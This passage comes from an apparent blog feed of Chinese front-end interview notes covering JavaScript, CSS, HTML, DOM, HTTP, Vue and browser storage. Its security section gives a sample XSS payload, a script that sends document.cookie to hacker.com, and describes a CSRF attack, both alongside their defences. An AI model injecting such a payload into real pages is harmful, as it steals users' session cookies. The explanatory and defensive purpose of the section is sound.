class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>JS 原型是什么？</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/23090041" target="_blank" rel="external">什么是 JS 原型链？</a><br><a href="https://wangsiyuan233.cn/2018/02/24/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–原型系列(1)</a><br><a href="https://wangsiyuan233.cn/2018/02/26/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–原型系列(2)</a><br><a href="https://wangsiyuan233.cn/2018/02/28/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–原型系列(3)</a><br><a href="https://wangsiyuan233.cn/2018/03/02/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–原型系列(4)</a><br><a href="https://wangsiyuan233.cn/2018/02/19/17%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9E%E4%BE%8B/" target="_blank" rel="external">原型链实例</a></p><blockquote><p>ES 6 中的 class 了解吗？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes" target="_blank" rel="external">MDN - 类</a></p><blockquote><p>JS 如何实现继承？</p></blockquote><p>1） 原型链<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">this</span>.body = <span class="string">'身体'</span></div><div class="line">  &#125;</div><div class="line">  Animal.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Human</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">      Animal.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>)</div><div class="line">      <span class="keyword">this</span>.name = name</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// Human.prototype.__proto__ = Animal.prototype // 非法</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line">  f.prototype = Animal.prototype</div><div class="line">  Human.prototype = <span class="keyword">new</span> f()</div><div class="line"></div><div class="line">  Human.prototype.useTools = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> frank = <span class="keyword">new</span> Human()</div></pre></td></tr></table></figure></p><p>2) extends 关键字<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor()&#123;</div><div class="line">        <span class="keyword">this</span>.body = '身体'</div><div class="line">    &#125;,</div><div class="line">    move()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor(name)&#123;</div><div class="line">        <span class="keyword">super</span>()</div><div class="line">        <span class="keyword">this</span>.name = name</div><div class="line">    &#125;,</div><div class="line">    useTools()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> frank = <span class="keyword">new</span> <span class="type">Human</span>()</div></pre></td></tr></table></figure></p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><blockquote><p>如何居中？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/03/29/33CSS%E5%B8%83%E5%B1%80%E6%96%B9%E6%A1%88%E4%B9%8Bflex-float/" target="_blank" rel="external">关于居中的一点点思考</a></p><blockquote><p>（必考） 说说盒模型。</p></blockquote><p>1）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)<br>2）有两种， IE 盒子模型、标准 W3C 盒子模型；IE的content部分包含了 border 和 padding;<br><img src="https://i.imgur.com/v7kdhsX.jpg" alt=""><br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p><blockquote><p>css reset 和 normalize.css 有什么区别？</p></blockquote><p>1）reset 重置，之前的样式我不要，<code>a{color: red;}</code>，抛弃默认样式<br>2）normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</p><blockquote><p>选择器优先级如何确定？</p></blockquote><p><strong>CSS 选择符：</strong><br>1.id选择器(# myid)<br>2.类选择器(.myclassname)<br>3.标签选择器(div, h1, p)<br>4.相邻选择器(h1 + p)<br>5.子选择器(ul &gt; li)<br>6.后代选择器(li a)<br>7.通配符选择器( * )<br>8.属性选择器(a[rel = “external”])<br>9.伪类选择器(a: hover, li:nth-child)</p><p><strong>优先级算法：</strong><br>1.优先级就近原则，同权重情况下样式定义最近者为准;<br>2.载入样式以最后载入的定位为准;<br>3.!important &gt;  id &gt; class &gt; tag<br>4.important 比 内联优先级高，但内联比 id 要高</p><blockquote><p>BFC 是什么？</p></blockquote><p>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）<br>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="external">（代码演示）</a>（方方用 padding-top: 1px;）</p><blockquote><p>如何清除浮动？</p></blockquote><p><a href="https://www.iyunlu.com/view/css-xhtml/55.html" target="_blank" rel="external">那些年我们一起清除过的浮动</a></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p>（必考） 你是如何理解 HTML 语义化的？</p></blockquote><p>1） 去掉或者丢失样式的时候能够让页面呈现出清晰的结构<br>2） 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；<br>3） 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；<br>4） 便于团队开发和维护，语义化使得网页更具可读性，是进一步开发网页的必要步骤，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><blockquote><p>meta viewport 是做什么用的，怎么写？</p></blockquote><p> <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</code><br> 控制页面在移动端不要缩小显示。<br> 一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。<br> 后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</p><blockquote><p>canvas 元素是干什么的？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" target="_blank" rel="external">canvas 入门手册</a></p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><blockquote><p>DOM 事件模型是什么？</p></blockquote><p>1)冒泡<br>2)捕获<br>3)如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，<a href="http://jsbin.com/raqakog/1/edit?js,console,output" target="_blank" rel="external">顺序是由监听顺序决定的。</a></p><blockquote><p>移动端的触摸事件了解吗？</p></blockquote><p>1）touchstart touchmove touchend touchcancel<br>2）模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。</p><blockquote><p>事件委托是什么？有什么好处？</p></blockquote><p>1）假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。<br>2）可以监听还没有出生的儿子（动态生成的元素）。省监听器。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span>&#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span>=&gt;&#123;</div><div class="line">     <span class="keyword">if</span>(<span class="keyword">e</span>.target.matches(selector))&#123;</div><div class="line">         fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line">     &#125;</div><div class="line"> &#125;)</div><div class="line">&#125;// 有 bug 但是可以应付面试官的事件委托</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</div><div class="line">     <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</div><div class="line">     <span class="keyword">while</span> (!el.matches(selector)) &#123;</div><div class="line">         <span class="keyword">if</span> (element === <span class="keyword">el</span>) &#123;</div><div class="line">             <span class="keyword">el</span> = null</div><div class="line">             <span class="keyword">break</span></div><div class="line">         &#125;</div><div class="line">         <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line"> &#125;)</div><div class="line"> <span class="keyword">return</span> element</div><div class="line">&#125; // 工资 <span class="number">12</span><span class="keyword">k</span>+ 的前端写的事件委托</div><div class="line">listen(ul, <span class="string">'click'</span>, <span class="string">'li'</span>, ()=&gt;&#123;&#125;)</div><div class="line"></div><div class="line">ul&gt;li*<span class="number">5</span>&gt;span</div></pre></td></tr></table></figure></p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><blockquote><p>HTTP 状态码知道哪些？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>301 和 302 的区别是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>HTTP 缓存怎么做？</p></blockquote><p><a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="external">HTTP缓存控制小结</a><br>1）<code>Cache-Control: max-age=300</code><br>2）避开缓存</p><blockquote><p>Cookie 是什么？Session 是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/20/18Cookie/" target="_blank" rel="external">小饼干</a><br><a href="https://wangsiyuan233.cn/2018/02/21/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>LocalStorage 和 Cookie 的区别是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/21/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>（必考）GET 和 POST 的区别是什么？</p></blockquote><p>1）参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。<br>2）安全（扯淡）。GET 没有 POST 安全（都不安全）<br>3）GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）<br>4）包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）<br>5）GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）</p><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？</p></blockquote><p><a href="https://segmentfault.com/a/1190000009624849" target="_blank" rel="external">同源策略与JS跨域（JSONP , CORS）</a><br><a href="https://www.jianshu.com/p/96a94b92e94e" target="_blank" rel="external">JSONP、CROS和postMessage跨域</a></p><h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><blockquote><p>（必考）Vue 有哪些生命周期钩子函数？</p></blockquote><p><a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="external">官方文档</a></p><blockquote><p>（必考）Vue 如何实现组件通信？</p></blockquote><p>1）父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）<br>2）爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）<br>3）<a href="https://cn.vuejs.org/v2/guide/state-management.html" target="_blank" rel="external">兄弟通信（new Vue() 作为 eventBus）</a></p><blockquote><p>Vuex 的作用是什么？</p></blockquote><p><a href="https://vuex.vuejs.org/zh/guide/" target="_blank" rel="external">官方文档</a></p><blockquote><p>VueRouter 路由是什么？</p></blockquote><p><a href="https://router.vuejs.org/zh/guide/#html" target="_blank" rel="external">官方文档</a><br><a href="http://www.cnblogs.com/keepfool/p/5690366.html" target="_blank" rel="external">Vue.js——vue-router 60分钟快速入门</a></p><blockquote><p>Vue 的双向绑定是如何实现的？有什么缺点？</p></blockquote><p><a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="external">深入响应式原理</a></p><blockquote><p>Computed 计算属性的用法？跟 Methods 的区别。</p></blockquote><p>1）computed是响应式的，methods并非响应式。<br>2）调用方式不一样，computed定义的成员像属性一样访问，methods定义的成员必须以函数形式调用。<br>3）computed是带缓存的，只有其引用的响应式属性发生改变时才会重新计算，而methods里的函数在每次调用时都要执行。<br>4）computed中的成员可以只定义一个函数作为只读属性，也可以定义get/set变成可读写属性，这点是methods中的成员做不到的</p><p>在我们的实际开发中，有时很难去确定具体用computed还是methods，因为这两种方法最后的到的结果是一样的，但是他们的原理和用法却完全不同，比如：我们想去时刻监控数据的变化，在视图上显示不同的结果，当然这两中方法都可以实现这种效果，这个时候用computed就比较合理了，因为computed是可缓存的，只要数据层值不改变，computed就不会去改变，而且可缓存，如果数据层的值变了，computed就会实时更新到视图层上，所以说computed是响应式的。</p><p>还有一个不同点就是在于computed是以对象的属性方式存在的，在视图层直接调用就可以得到值，而methods必须以函数形式调用，可见，computed直接以对象属性方式调用，而methods必须要函数执行才可以得到结果。</p><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><blockquote><p>什么是 XSS 攻击？如何预防？</p></blockquote><p>1）举例<br><code>div.innerHTML = userComment</code><br>// userComment<br>内容是 <code>&lt;script&gt;$.get(&#39;http://hacker.com?cookie=&#39;+document.cookie)&lt;/script&gt;</code><br>// 恶意就被执行了，这就是 XSS<br>2)<br>2.1不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行<br>2.2如果你一样要用 innerHTML，字符过滤<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ‘ 替换成 &#39;<br>把 ‘ 替换成 &quot;<br>代码 <code>div.innerHTML = userComment.replace(/&gt;/g, &#39;&amp;lt;&#39;).replace...</code><br>2.3使用 CSP Content Security Policy</p><blockquote><p>什么是 CSRF 攻击？如何预防？</p></blockquote><p>1)过程<br>用户在 qq.com 登录<br>用户切换到 <code>hacker.com</code>（恶意网站）<br>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。<br>用户在不知不觉中添加 hacker 为好友。<br>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。<br>2）避免<br>检查 referer，qq.com 可以拒绝来自<code>hacker.com</code> 的请求<br><code>csrf_token</code> 来解决</p><h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><blockquote><p>转译出的文件过大怎么办？</p></blockquote><p>1）使用 code split<br>2）写法<code>import(&#39;xxx&#39;).then(xxx=&gt;{console.log(xxx)})</code><br>3）xxx 模块就是按需加载的</p><blockquote><p>转译速度慢什么办？</p></blockquote><p>对不起我不会好吗，什么问题</p><blockquote><p>写过 webpack loader 吗？</p></blockquote><p>如何开发一个<a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" target="_blank" rel="external"> webpack loader</a></p><h1 id="发散题"><a href="#发散题" class="headerlink" title="发散题"></a>发散题</h1><blockquote><p>从输入 URL 到页面展现中间发生了什么？</p></blockquote><p>1）DNS 查询 DNS 缓存<br>2）建立 TCP 连接（三次握手）连接复用<br>3）发送 HTTP 请求（请求的四部分）<br>4）后台处理请求<br>  监听 80 端口<br>  路由<br>  渲染 HTML 模板<br>  生成响应<br>5）发送 HTTP 响应<br>6）关闭 TCP 连接（四次挥手）<br>7）解析 HTML<br>8）下载 CSS（缓存<br>9）解析 CSS<br>10）下载 JS（缓存<br>11）解析 JS<br>12）下载图片<br>13）解析图片<br>14）渲染 DOM 树<br>15）渲染样式树<br>16）执行 JS</p><blockquote><p>你没有工作经历吗？</p></blockquote><p>一开始就问，可以拜拜。<br>中间问最后问，他想压价。<br>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。</p><h1 id="刁钻代码"><a href="#刁钻代码" class="headerlink" title="刁钻代码"></a>刁钻代码</h1><p><a href="http://wangsiyuan233.cn/2018/06/20/55JavaScript-Puzzlers/" target="_blank" rel="external">JavaScript Puzzlers!</a></p><h1 id="前端算法"><a href="#前端算法" class="headerlink" title="前端算法"></a>前端算法</h1><p>1）<a href="http://wangsiyuan233.cn/2018/07/19/62%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" target="_blank" rel="external">排序算法</a>（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）<br>2）<a href="https://wangsiyuan233.cn/2018/07/24/63%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#more" target="_blank" rel="external">二分查找法</a><br>3）<a href="https://wangsiyuan233.cn/2018/07/25/64%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/" target="_blank" rel="external">二叉树</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;JavaScript&quot;&gt;&lt;a href=&quot;#JavaScript&quot; class=&quot;headerlink&quot; title=&quot;JavaScript&quot;&gt;&lt;/a&gt;JavaScript&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JS 有哪些数据类型？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;七个小矮子：&lt;code&gt;string&lt;/code&gt; &lt;code&gt;number&lt;/code&gt; &lt;code&gt;bool&lt;/code&gt; &lt;code&gt;undefined&lt;/code&gt; &lt;code&gt;null&lt;/code&gt; &lt;code&gt;object&lt;/code&gt; &lt;code&gt;symbol&lt;/code&gt;&lt;br&gt;&lt;code&gt;object&lt;/code&gt; 包括了数组、函数、正则、日期等对象&lt;br&gt;一旦出现（数组、函数、正则、日期、NaN）直接0分&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（必考） Promise 怎么使用？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://wangsiyuan233.cn/2018/04/02/36%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-2/&quot;&gt;深入理解JavaScript–异步系列(2)&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>前端总结1</title>
    <link href="wangsiyuan233.github.io/2018/07/14/60%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%931/"/>
    <id>wangsiyuan233.github.io/2018/07/14/60面试题目总结1/</id>
    <published>2018-07-14T09:16:52.000Z</published>
    <updated>2018-07-17T23:13:51.784Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>请你谈谈Cookie的弊端</p></blockquote><p><strong>优点</strong>： 极高的扩展性和可用性<br>1) 数据持久性。<br>2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。<br>3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。<br>4) 简单性。 基于文本的轻量结构。<br>5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。<br>6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。<br>7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。<br><a id="more"></a><br><strong>缺点</strong>：<br>1) Cookie 数量和长度的限制 。<br>数量：每个域的 cookie 总数有限。<br>a) IE6 或更低版本最多 20 个 cookie<br>b) IE7 和之后的版本最后可以有 50 个 cookie<br>c) Firefox 最多 50 个 cookie<br>d) chrome 和 Safari 没有做硬性限制<br>长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。<br>2) 潜在的安全风险 。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能取得所有的 session 信息。<br>3) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。<br>4) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p><blockquote><p>简单说一下浏览器本地存储是怎样的</p></blockquote><p>1)Cookie ： 广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。<br>2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。<br>优点：容量适中，基本上不存在兼容性问题<br>缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。<br>3)Google Gears ： Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。<br>4)User Data ： 是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。<br>（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）<br>（实际测试 2000 （ IE5.5 ）、 XP （ IE6 、 IE7 ）， Vista （ IE7 ）下都是可正常使用。）<br>5)Web Storage<br>在较高版本的浏览器中，JS 提供了 sessionStorage 和 globalStorage 。<br>在 HTML5 中提供了 sessionStorage 和 localStorage 。<br>sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。<br>globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。<br>localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上。<br>优点：容量大、易用、强大、原生支持<br>缺点： a) 兼容性差（ Chrome,  Safari, Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）<br>b) 安全性差（所以请勿使用 localStorage 保存敏感信息）</p><blockquote><p>web storage和cookie的区别</p></blockquote><p>1)存储空间不同 。<br>a)Web Storage 能提供 5MB 的存储空间（不同 浏览器 的提供的空间不同）<br>Cookie 仅 4KB 。<br>b)Web Storage 每个域（包括子域）有独立的存储空间，各个存储空间是完全独立的，因此不会造成数据混乱。<br>2)与服务器交互 。<br>Web Storage 中的数据则仅仅是存在本地，不会与服务器发生任何交互。<br>Cookie 的内容会随着请求一并发送的服务器（带宽浪费）。<br>3)接口 。<br>Web Storage 提供更多丰富易用的接口，拥有 setItem ， getItem ， removeItem ， clear 等方法，操作数据更方便。<br>Cookie 需要前端开发者自己封装 setCookie ， getCookie 。<br>4)跨域问题 。<br>cookie 需要指定作用域，不可以跨域调用。<br>说明： Cookie 也是不可以或缺的： Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在 ，而 Web Storage 仅仅是为了在本地“存储”数据而生。</p><blockquote><p>display:none和visibility:hidden的区别？</p></blockquote><p>1) <code>display：none</code>会让元素从渲染树中消失，渲染的时候不占据任何空间；<code>visibility：hidden</code>不会让元素从渲染树中消失，渲染的时候仍然占据空间，只是内容不可见。<br>2) <code>display：none</code>是非继承属性，子孙节点消失是由于元素从渲染树中消失造成，通过修改子孙节点的属性无法显示；<code>visibility：hidden</code>是继承属性，子孙节点消失是由于继承了hidden，通过设置visibility：visible，可以让子孙节点显示。<br>3) 读屏器不会读取<code>display：none</code>的元素内容，而会读取<code>visibility：hidden</code>的元素内容。</p><blockquote><p>CSS中 link 和@import 的区别是？</p></blockquote><p>1) 导入的语法不相同<br>link （链接式）语法为：<br> <code>&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;/&gt;</code><br>@import （导入式）语法为：<br> <code>&lt;style type=&quot;text/css&quot;&gt; @import url(&quot;style.css&quot;); &lt;/style&gt;</code><br>2)  link 和 import 语法结构不同，前者 <code>&lt;link&gt;</code> 是 html 标签，只能放入 html 源代码中使用， link 标签除了可以加载 CSS 外，还可以做很多其它的事情，比如定义 RSS ，定义 rel 连接属性等， @import 看作为 css 的样式，就只能加载 CSS 了；<br>3) 使用 link 方式，浏览器将 CSS 文件和 HTML 的主体部分一同装载，所以显示出来的页面从开始就是带样式效果的；而采用 @import 方式，浏览器则会先装载完整个 HTML 文件后再装载 CSS 文件；<br>4) 当使用 Javascript 控制 DOM 去改变样式的时候，只能使用 link 方式，因为 @import 眼里只有 CSS ，不是 DOM 可以控制的；<br>5) link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持</p><blockquote><p>position的absolute与fixed共同点与不同点</p></blockquote><p>共同点：<br>1) 改变行内元素的呈现方式，display被置为inline-block；<br>2) 让元素脱离普通流，不占据空间；<br>3) 默认会覆盖到非定位元素上</p><p>不同点：<br>absolute的”根元素“是可以设置的，而fixed的”根元素“固定为浏览器窗口。<br>当你滚动网页，fixed元素与浏览器窗口之间的距离是不变的。</p><blockquote><p>介绍一下CSS的盒子模型？</p></blockquote><p>1）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)<br>2）有两种， IE 盒子模型、标准 W3C 盒子模型；IE的content部分包含了 border 和 padding;<br><img src="https://i.imgur.com/v7kdhsX.jpg" alt=""></p><blockquote><p>CSS 选择符有哪些？哪些属性可以继承？优先级算法如何计算？ CSS3新增伪类有那些？</p></blockquote><p><strong>CSS 选择符：</strong><br>1.id选择器(# myid)<br>2.类选择器(.myclassname)<br>3.标签选择器(div, h1, p)<br>4.相邻选择器(h1 + p)<br>5.子选择器(ul &gt; li)<br>6.后代选择器(li a)<br>7.通配符选择器( * )<br>8.属性选择器(a[rel = “external”])<br>9.伪类选择器(a: hover, li:nth-child)</p><p><strong>可继承的样式：</strong><br>1.font-size<br>2.font-family<br>3.color<br>4.text-indent</p><p><strong>不可继承的样式：</strong><br>1.border<br>2.padding<br>3.margin<br>4.width<br>5.height</p><p><strong>优先级算法：</strong><br>1.优先级就近原则，同权重情况下样式定义最近者为准;<br>2.载入样式以最后载入的定位为准;<br>3.!important &gt;  id &gt; class &gt; tag<br>4.important 比 内联优先级高，但内联比 id 要高</p><p><strong>CSS3新增伪类举例：</strong><br>p:first-of-type 选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:last-of-type  选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-of-type  选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-child    选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:nth-child(2)  选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。<br>:enabled :disabled 控制表单控件的禁用状态。<br>:checked        单选框或复选框被选中。</p><blockquote><p>列出display的值，说明他们的作用。position的值， relative和absolute分别是相对于谁进行定位的？</p></blockquote><p>display 的值的作用：<br>1.block 象块类型元素一样显示。<br>2.inline 缺省值。象行内元素类型一样显示。<br>3.inline-block 象行内元素一样显示，但其内容象块类型元素一样显示。<br>4.list-item 象块类型元素一样显示，并添加样式列表标记。</p><p>position 的值的定位区别：<br>1.absolute 生成绝对定位的元素，相对于 static 定位以外的第一个祖先元素进行定位。<br>2.fixed 生成固定定位的元素，相对于浏览器窗口进行定位（老IE不支持）。<br>3.relative 生成相对定位的元素，相对于其在普通流中的位置进行定位。<br>4.static 默认值。没有定位，元素出现在正常的流中（忽略 